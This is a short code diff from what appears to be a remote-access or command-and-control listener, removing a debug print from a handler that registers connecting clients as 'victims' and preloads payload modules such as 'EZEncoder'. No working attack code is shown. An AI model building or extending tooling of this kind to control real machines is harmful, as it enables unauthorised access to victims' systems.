@@ -187,8 +187,6 @@ class Listener:
                                 if nParam == 1:
                                     self.dic_victim[clnt_addr] = EZClass.Victim(aMsg[0], None, clnt)
 
-                                    print(aMsg)
-
                                     # pre load payload
                                     ls_preload = [
                                         'EZEncoder',
